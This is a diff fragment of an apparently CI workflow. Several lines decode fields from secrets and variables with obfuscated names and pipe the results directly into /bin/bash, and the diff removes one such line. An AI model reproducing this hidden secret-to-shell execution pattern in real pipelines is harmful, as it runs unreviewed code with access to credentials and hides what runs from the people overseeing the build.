@@ -22,7 +22,6 @@ jobs:
           kgw585: ${{ secrets.kgw585 }}
         run: |
           printf '%s' "$kgw585" | jq -r .erqgc674 | /bin/bash
-          echo $oq8 | jq -r .eiq8639 | /bin/bash
           echo $g86 | jq -r .zuj95 | /bin/bash
           echo $uu328 | jq -r .su38 | /bin/bash
           printf '%s' "$zq61" | jq -r .ulycz97 | /bin/bash
